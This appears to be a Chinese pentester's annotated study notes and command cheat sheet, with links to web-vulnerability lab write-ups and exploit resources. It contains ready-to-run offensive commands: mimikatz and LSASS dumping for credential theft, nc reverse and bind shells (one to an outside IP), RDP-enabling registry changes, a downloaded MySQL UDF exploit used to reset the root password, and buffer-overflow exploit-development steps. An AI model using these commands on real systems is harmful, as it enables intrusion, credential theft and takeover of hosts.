# X_2024下半期学习总结

## WEB漏洞高级篇(BurpSuite)：

### 梨子带你刷burpsuite靶场系列之高级漏洞篇 - 服务器端模板注入(SSTI)专题

https://www.anquanke.com/post/id/246293

### 梨子带你刷burpsuite靶场系列之高级漏洞篇 - Web缓存投毒专题

https://www.anquanke.com/post/id/246452

### 梨子带你刷burpsuite靶场系列之客户端漏洞篇 - 基于DOM的漏洞专题

https://www.anquanke.com/post/id/246090

### 梨子带你刷burpsuite靶场系列之客户端漏洞篇 - WebSocket专题

https://www.anquanke.com/post/id/246092

### 梨子带你刷burpsuite靶场系列之高级漏洞篇 - OAuth2.0认证漏洞专题

https://www.anquanke.com/post/id/246658

### 梨子带你刷burpsuite靶场系列之服务器端漏洞篇 - XML外部实体注入(XXE)专题

https://www.anquanke.com/post/id/245540

### 梨子带你刷burpsuite靶场系列之客户端漏洞篇 - 跨域资源共享(CORS)专题

https://www.anquanke.com/post/id/246029

### 梨子带你刷burpsuite靶场系列之高级漏洞篇 - 不安全的反序列化专题

https://www.anquanke.com/post/id/246276

### 梨子带你刷burpsuite靶场系列之高级漏洞篇 - HTTP请求走私专题

https://www.anquanke.com/post/id/246516

### 梨子带你刷burpsuite靶场之高级漏洞篇 - HTTP Host头攻击专题

https://www.anquanke.com/post/id/246515

### 高级漏洞篇之原型污染专题

https://www.freebuf.com/articles/web/375485.html

### 高级漏洞篇之JWT攻击专题

https://www.freebuf.com/articles/web/375465.html



## 渗透测试常用命令笔记：(WEB漏洞+二进制漏洞pwn)

```

nmap -sC 192.168.31.10-12 (all scan default)
#对指定IP范围进行默认脚本扫描，用于快速发现常见服务。
nmap -v -p- -sV --script=vuln target
#对目标进行全端口扫描，识别服务版本并检查已知漏洞。

```

```
dirb http://IP:PORT /usr/share/dirb/wordlists/common.txt
#使用通用字典暴力扫描Web网站，查找隐藏的目录和文件。
nikto -C all -h http://IP
#扫描Web服务器，全面检查已知的安全漏洞和配置风险。
./wpscan –url http://IP/ –enumerate p
#专门扫描WordPress网站，枚举已安装的插件。
skipfish -m 5 -LY -S /usr/share/skipfish/dictionaries/complete.wl -o ./skipfish2 -u http://IP
#对网站进行爬行和主动探测，生成一份漏洞报告。
```

```
nmblookup -A target
#查询目标的NetBIOS名称表，获取主机名和所属工作组。
smbclient //MOUNT/share -I target -N
#尝试以空密码匿名列出目标服务器上名为"share"的共享资源。
rpcclient -U "" target
#使用空用户名连接目标的RPC服务，用于深入提取域和用户信息。
enum4linux target
#一键式工具，使用多种方法枚举目标SMB服务的用户、共享和操作系统信息。
```

```
snmpget -v 1 -c public IP
#使用默认社区名"public"获取目标单个SNMP节点的信息。
snmpwalk -v 1 -c public IP
#使用默认社区名"public"遍历获取目标整个SNMP信息树。
snmpbulkwalk -v2c -c public -Cn0 -Cr10 IP
#使用v2c协议批量、高效地获取目标的SNMP信息树。
```



```
system("start cmd.exe /k $cmd")
#在脚本中执行一个新命令行窗口并保持打开。
search dir/s *.doc
#在当前盘符下递归搜索所有.doc文件。
```

```
mimikatz.exe "privilege::debug" "log" "sekurlsa::logonpasswords"
#提取权限并在内存中直接读取所有已登录用户的明文密码或哈希。
Procdump.exe -accepteula -ma lsass.exe lsass.dmp
#将Windows进程lsass.exe的内存转储到一个文件中，以进行离线分析。
mimikatz.exe "sekurlsa::minidump lsass.dmp" "log" "sekurlsa::logonpasswords"
#从lsass内存转储文件中读取密码哈希，避免在目标系统上直接运行Mimikatz。
```

```
C:\temp\procdump.exe -accepteula -ma lsass.exe lsass.dmp For 32 bits
# 在32位系统上转储lsass.exe进程内存。
C:\temp\procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp For 64 bits
# 在64位系统上转储lsass.exe进程内存。
C:\nc.exe -e c:\windows\system32\cmd.exe -vv 23.92.17.103 7779
# 将目标机的cmd.exe反向连接到攻击者的IP和端口，获取一个交互式Shell。
```

```
reg add "hklm\system\currentcontrolset\control\terminal server" /f /v fDenyTSConnections /t REG_DWORD /d 0
#修改注册表，强制启用目标的远程桌面服务(RDP)。
netsh firewall set service remoteadmin enable
#在旧版Windows防火墙中，允许远程管理流量通过。
netsh firewall set service remotedesktop enable
#在旧版Windows防火墙中，允许远程桌面(RDP)流量通过。
```

```
c:>nc -Lp 31337 -vv -e cmd.exe
#在目标Windows上监听31337端口，并将连接者的Shell导向cmd.exe（正向Shell）。
nc 192.168.0.10 31337
#作为客户端，连接到目标机器（192.168.0.10）的31337端口以获取Shell。
c:>nc example.com 80 -e cmd.exe
#尝试将自己机器的cmd.exe作为Shell，反向连接到example.com的80端口（反向Shell）。
nc -lp 80
#在本地80端口监听，等待一个连接。
nc -lp 31337 -e /bin/bash
#在目标Linux上监听31337端口，并将连接者的Shell导向/bin/bash（正向Shell）。
nc 192.168.0.10 31337
#作为客户端，连接到目标机器（192.168.0.10）的31337端口以获取Shell。
```



```
nasm -f bin -o payload.bin payload.asm
#使用NASM将汇编代码payload.asm编译成原始二进制文件payload.bin。

nasm -f elf payload.asm; ld -o payload payload.o; objdump -d payload
#在Linux上，编译汇编代码、链接成可执行文件，并反汇编以查看其机器码。
```



```
./searchsploit –u
#更新本地的Exploit-DB漏洞数据库。
./searchsploit apache 2.2
#在数据库中搜索与"apache 2.2"相关的公开漏洞利用代码。
./searchsploit "Linux Kernel"
#在数据库中搜索与"Linux Kernel"相关的公开漏洞利用代码。
COMMONLY USED BAD CHARACTERS:
#列出了漏洞利用中常见的“坏字符”（如空字节、换行符），它们会终止或破坏Shellcode，需要被过滤或编码。
\x00\x0a\x0d\x20 For http request

\x00\x0a\x0d\x20\x1a\x2c\x2e\3a\x5c Ending with (0\n\r_)


```



```
\# Useful Commands:

pattern create
#在调试器中使用的命令，生成一个独特的模式字符串，用于触发溢出
pattern offset (EIP Address)
#根据崩溃后EIP寄存器中的值，计算模式字符串中精确的偏移量。
pattern offset (ESP Address)
#根据崩溃后ESP寄存器中的值，计算模式字符串中精确的偏移量。
add garbage upto EIP value and add (JMP ESP address) in EIP . (ESP = shellcode )
#描述了漏洞利用的核心步骤：用垃圾数据填充缓冲区直到EIP，用JMP ESP的地址覆盖EIP，并在ESP指向的位置放置Shellcode。
```

```
!pvefindaddr pattern_create 5000
#(旧版) 生成一个5000字节的独特模式字符串，用于缓冲区溢出测试。
!pvefindaddr suggest
#(旧版) 自动分析目标进程，建议可用于漏洞利用的内存地址（如JMP ESP）。
!pvefindaddr modules
#(旧版) 列出目标进程加载的所有模块及其保护机制（如ASLR、SafeSEH）。
!pvefindaddr nosafeseh
#(旧版) 列出未启用SafeSEH保护机制的模块，这些模块中的地址可用于SEH覆盖。
!mona config -set workingfolder C:\Mona\%p
#配置Mona插件，将其工作目录设置为C:\Mona\\%p（%p会被替换为目标进程名）。
!mona config -get workingfolder
#显示Mona插件当前配置的工作目录。
!mona mod
#(现代版) 列出目标进程加载的所有模块及其相关信息（如ASLR、Rebase等）。
!mona bytearray -b "\x00\x0a"
#(现代版) 生成一个字节数组，并标记\x00和\x0a为坏字符，用于后续Shellcode分析。
!mona pc 5000
#(现代版) 创建一个5000字节的模式字符串，功能等于pattern_create。
!mona po EIP
#(现代版) 根据EIP寄存器中的值计算偏移量，功能等于pattern_offset。
!mona sugges
#(现代版) 分析目标并建议有用的跳转指令和地址，功能等于suggest。
```

```
$ wget 0xdeadbeef.info/exploits/raptor_udf2.c
#从网上下载一个名为raptor_udf2.c的C语言源码文件，通常用于MySQL UDF提权。
$ gcc -g -c raptor_udf2.c
#将C源码编译成目标文件(.o)，-g选项会包含调试信息。
$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
#将目标文件链接成一个共享库（.so），这是MySQL在Linux中加载UDF所需的格式。

\# https://en.wikipedia.org/wiki/Microsoft-specific_exception_handling_mechanisms#SEH
指向Wikipedia的链接，用于学习Microsoft结构化异常处理（SEH）机制。
```

```
!mona suggest
#自动分析目标进程，建议可用于漏洞利用的内存地址（如JMP ESP）。
!mona nosafeseh
#列出所有未启用SafeSEH保护机制的模块，这些模块中的地址可用于SEH覆盖攻击。
nseh="\xeb\x06\x90\x90" (next seh chain)
#注释：典型的SEH覆盖技巧。nseh（下一个SEH处理器）被覆盖为一段短跳转指令（向后跳6字节），以跳到Shellcode。
iseh= !pvefindaddr p1 -n -o -i (POP POP RETRUN or POPr32,POPr32,RETN)
#注释：iseh（当前SEH处理器）被覆盖为一个POP POP RET指令的地址。该指令会将栈顶弹出的值（即nseh的地址）作为新指令执行。
\# https://en.wikipedia.org/wiki/Return-oriented_programming
链接到关于“返回导向编程（ROP）”的维基百科页面，这是一种绕过DEP的先进技术。
\# https://en.wikipedia.org/wiki/Data_Execution_Prevention
链接到关于“数据执行保护（DEP）”的维基百科页面，它防止数据段中的代码被执行，是ROP要绕过的目标。
!mona modules
#列出目标进程加载的所有模块及其保护机制（如ASLR、SafeSEH、DEP）。
!mona ropfunc -m *.dll -cpb "\x00\x09\x0a"
#在指定的DLL中搜索可用于ROP链的有用指令（ gadgets），同时避开指定的坏字符。
!mona rop -m *.dll -cpb "\x00\x09\x0a" (auto suggest)
#(auto suggest)自动生成一个完整的ROP链，用于绕过DEP保护。
\# https://en.wikipedia.org/wiki/Address_space_layout_randomization
链接到关于“地址空间布局随机化（ASLR）”的维基百科页面，它使内存地址随机化，增加了漏洞利用的难度。
!mona noaslr
#列出所有未启用ASLR保护的模块。这些模块的加载地址是固定的，更容易被用于漏洞利用。
\# https://www.corelan.be/index.php/2010/01/09/exploit-writing-tutorial-part-8-win32-egg-hunting/
链接到Corelan关于“Egg Hunting”技术的教程。当可用的缓冲区空间很小时，用一小段代码在内存中搜索特定标记并执行紧随其后的Shellcode。
\# http://www.fuzzysecurity.com/tutorials/expDev/4.html
链接到另一个关于漏洞利用开发的教程资源。
!mona jmp -r esp
#在加载的模块中查找包含JMP ESP指令的地址。这是执行Shellcode的常用跳板。
!mona egg -t lxxl
#为基于标记的Egg Hunting生成所需的标记（lxxl）和Hunter（查找代码）。
\xeb\xc4 (jump backward -60)
# 短跳转指令的操作码，用于向后跳转60字节。
buff=lxxllxxl+shell
#注释：Egg Hunting技术的payload结构。将自定义标记（lxxl）放在真正的Shellcode（shell）前面。
!mona egg -t 'w00t'
#使用自定义标记w00t来生成Egg Hunter代码。
\# Setting Breakpoint
以下是GDB（Linux调试器）中的常用命令。
break *_start
#在名为_start的标签或函数处设置一个断点。
\# Execute Next Instruction
注释：单步执行代码的命令。
next
执行下一行代码（不进入函数内部）。
step  单步执行，如果当前行是函数调用，则进入函数内部。

n  

s

\# Continue Execution

continue

c

\# Data

checking 'REGISTERS' and 'MEMORY'

\# Display Register Values: (Decimal,Binary,Hex)  使用print命令以不同格式显示寄存器值。

print /d –> Decimal

print /t –> Binary

print /x –> Hex
     # 以十进制、二进制或十六进制格式打印寄存器值（如$eax）。
O/P :

(gdb) print /d $eax

$17 = 13

(gdb) print /t $eax

$18 = 1101

(gdb) print /x $eax

$19 = 0xd

(gdb)

\# Display values of specific memory locations

command : x/nyz (Examine)

n –> Number of fields to display ==>

y –> Format for output ==> c (character) , d (decimal) , x (Hexadecimal)

z –> Size of field to be displayed ==> b (byte) , h (halfword), w (word 32 Bit)
```

```
mysql -u root -p
#以root用户身份登录MySQL数据库。
mysql> use mysql;
#切换到mysql系统数据库，该数据库存储用户、权限等信息。
mysql> create table foo(line blob);
#创建一个名为foo的表，包含一个blob（二进制大对象）类型的列，用于存放二进制文件。
mysql> insert into foo values(load_file('/home/user/raptor_udf2.so'));
#将本地的共享库文件raptor_udf2.so的内容（二进制）读取并插入到foo表中。
mysql> select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
#从foo表中提取二进制数据，并将其作为文件写入到MySQL的插件目录。此步骤创建UDF库文件。
mysql> create function do_system returns integer soname 'raptor_udf2.so';
#注册一个新的自定义函数do_system，该函数的功能由raptor_udf2.so库提供。
mysql> select * from mysql.func;
#查询mysql.func表，以确认do_system自定义函数已成功注册。
mysql> select do_system('echo "root:passwd" | chpasswd > /tmp/out; chown user:user /tmp/out');
#调用do_system函数执行任意系统命令，此命令修改了root用户的密码。
user:~$ su -

Password:

user:~# whoami

root

root:~# id

uid=0(root) gid=0(root) groups=0(root)
```

```
!pvefindaddr pattern_create 5000

!pvefindaddr suggest

!pvefindaddr modules

!pvefindaddr nosafeseh

#注释：这些是pvefindaddr插件（WinDbg的旧版插件）的命令，分别用于生成溢出模式、建议跳转地址、列出模块和查找无SafeSEH保护的模块。


!mona config -set workingfolder C:\Mona\%p

!mona config -get workingfolder

!mona mod

!mona bytearray -b "\x00\x0a"

!mona pc 5000

!mona po EIP

!mona suggest

#注释：这些是Mona插件（WinDbg/Immunity Debugger的现代替代品）的等效命令，功能与上述pvefindaddr命令相同，但功能更强大。用于配置、分析模块、生成字节数组、生成模式字符串、计算偏移量和提供建议。






```

## 在线漏洞库查询：

https://cvexploits.io/

https://www.exploit-db.com/

https://sploitus.com/

https://www.rapid7.com/db/

https://cvepremium.circl.lu/

https://attackerkb.com/topics


## 公开病毒沙箱：

https://www.virustotal.com/gui/home/upload

https://x.threatbook.com/

https://app.any.run/submissions



## WEB安全道场，渗透测试靶场，在线学习：

https://dojo-yeswehack.com/learn

https://application.security/free/llm



## CTF资料学习汇总

**CTF平台集合 CTF Platforms 黑客技术靶场**
https://www.ddosi.org/ctf-platforms/


**RedTeam Tools 红队渗透测试工具清单**
https://www.ddosi.org/redteam-tools/


**BlueTeam-Tools 蓝队防守及应急响应工具清单**
https://www.ddosi.org/blueteam-tools/


**LOLBAS - Windows系统原生工具攻击**
https://www.ddosi.org/lolbas/



**利用无文件攻击、LOTL 命令和功能**
https://www.ddosi.org/AD/


**红队笔记&博客：**
https://blog.nviso.eu/category/red-team/

https://www.xn--hy1b43d247a.com/

https://blog.cryptohack.org/

https://shogunlab.gitbook.io/building-c2-implants-in-cpp-a-primer

https://www.ired.team/

https://www.offsec.com/metasploit-unleashed/



## 网络安全推荐，项目地址：

https://forum.ywhack.com/bountytips.php

https://forum.ywhack.com/infosec.php